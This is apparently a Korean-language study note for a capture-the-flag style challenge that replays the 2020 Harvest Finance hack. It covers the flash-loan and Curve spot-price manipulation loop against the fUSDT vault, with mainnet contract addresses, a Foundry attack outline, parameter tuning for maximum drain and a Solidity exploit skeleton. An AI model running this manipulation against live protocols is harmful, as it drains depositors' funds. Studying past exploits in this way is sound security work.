# Case: Harvest Finance (Ethereum, 2020-10-26)

## Overview

- **체인**: Ethereum mainnet
- **피해 금액**: ~$33.8M
- **공격 유형**: Curve pool spot price oracle manipulation
- **참조**: rekt.news/harvest-finance-rekt
- **공격자 주소**: `0xf224ab004461540778a914ea397c589b677e27bb`
- **공격 TX (첫 번째)**: `0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877`
- **공격 시점 fork block**: 11128633 (Tornado Cash 펀딩 직전)

## 프로토콜 구조

Harvest는 yield aggregator (TradFi의 ETF 유사). 사용자가 stablecoin 입금하면 vault share 발행 → 전략 컨트랙트가 yCRV(Curve LP) 보유 → 주기적으로 reward claim 후 재투자.

**Vault share 발행 공식**:
```solidity
toMint = totalSupply() == 0 
    ? amount 
    : amount.mul(totalSupply()).div(underlyingBalanceWithInvestment());
```

`underlyingBalanceWithInvestment()`:
```solidity
return underlyingBalanceInVault().add(IStrategy(strategy()).investedUnderlyingBalance());
```

`investedUnderlyingBalance()` (CurveStrategy):
```solidity
uint256 shares = IERC20(yCrvVault).balanceOf(address(this));
uint256 price = IVault(yCrvVault).getPricePerFullShare();
uint256 ycrvBalance = shares.mul(price).div(1e18);
uint256 ycrvValue = underlyingValueFromYCrv(ycrvBalance);
//      ↑ 이게 Curve의 calc_withdraw_one_coin 호출
```

**문제**: `calc_withdraw_one_coin`은 Curve pool의 현재 reserves 기반 → spot price 사용 → **manipulable**

## 공격 메커니즘

1. **Flash loan**: dYdX 또는 Aave에서 USDT, USDC 대량 borrow
2. **Curve yUSD pool에서 USDC → USDT swap**: pool에서 USDT 빠지고 USDC 들어감 → USDT 가격 ↑
3. **Harvest fUSDT vault에 USDT deposit**: 조작된 USDT 가격 기준으로 vault share 과다 수령
4. **Curve에서 USDT → USDC swap (역방향)**: pool 원상 복구 (공격 비용 회수)
5. **Harvest에서 vault share withdraw**: 정상 가격으로 USDT 더 많이 받아감
6. **반복**: Arbitrage check (±3%) 임계 바로 아래에서 17회 정도 반복
7. **Flash loan 상환**

핵심: Arbitrage check가 단일 swap 단위로만 평가 → 임계 직전까지 swap 후 즉시 deposit/withdraw → 누적 효과로 풀 다 털림

## ch2 챌린지 적용

### 핵심 컨트랙트 주소 (메인넷 기준)
- Harvest fUSDT Vault (proxy): `0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C`
- Vault implementation (당시): `0x9b3be0cc5dd26fd0254088d03d8206792715588b`
- Curve Strategy: `0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c`
- yCurve pool: `0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51`
- USDT: `0xdAC17F958D2ee523a2206206994597C13D831ec7`
- USDC: `0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48`

### 공격 절차 (Foundry script)
```
1. Aave/Maker flashloan  X USDT + Y USDC
2. for i in 0..N:
     a. Curve.exchange(USDC_idx, USDT_idx, swap_size, 0)  // pump USDT
     b. fUSDT.deposit(usdt_amount)  // get inflated shares
     c. Curve.exchange(USDT_idx, USDC_idx, swap_size, 0)  // dump USDT
     d. fUSDT.withdraw(shares)  // get more USDT
3. flashloan repay
4. profit USDT/USDC → swap to ETH → unwrap
```

### 파라미터 튜닝
- `swap_size`: ±3% guard 직전 (binary search)
- `usdt_amount`: 받은 share / iteration 당 marginal 수익이 양수인 최대치
- `N`: marginal profit이 0으로 수렴하는 지점

## 점수 최적화

멘토 강의 사례:
- 한 번 시도: $249K profit (10 iteration, 5M USDT swap)
- swap size 키우고 iteration 30 → $6.4M
- iteration 200 → $40M
- iteration 1086 → $50M+ 까지 가능 (단 가스 무시했을 때)
- **96.5% drain까지 도달**, 그 이후는 marginal profit ≈ 0

**과제 환경에서는 우리 EOA의 native(ETH) balance 증가가 점수**. USDT/USDC를 ETH로 변환 필요. Uniswap V3 USDT/WETH 0.05% pool 사용 권장 + WETH unwrap.

## A/B/C/D 분류 요약

- A: Curve spot price를 share pricing oracle로 사용
- B: TWAP, Chainlink (없음)
- C: ±3% arbitrage check (반복으로 우회)
- D: Curve fee 0.04%/swap, flash loan fee, gas, optimal N 계산 필수

## 예상 PoC 구조

```solidity
interface IHVault {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
}
interface ICurvePool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
    // yCurve uses exchange_underlying for direct USDT/USDC pair
}
interface IFlashLoan { ... }

contract HarvestExploit {
    function exploit(uint256 N, uint256 swapSize, uint256 depositAmt) external {
        // flash loan
        // for-loop
        // repay
    }
    function onFlashLoan(...) external returns (...) {
        // pump → deposit → dump → withdraw, N times
    }
}
```

## Codex 위임 시 주의

- yCurve는 Vyper 컨트랙트 — Solidity interface 직접 작성
- `exchange_underlying`은 `int128` 인덱스 사용 (signed!)
- Harvest withdraw가 fee 없는지 확인 (vault의 withdrawFee())
- USDT는 비표준 ERC20 (return값 없음) — `forceApprove` 또는 SafeERC20 사용
- gas profile: 한 iteration에 ~600K gas. block gas limit 30M 가정 시 max 50회/tx. 여러 tx로 분할
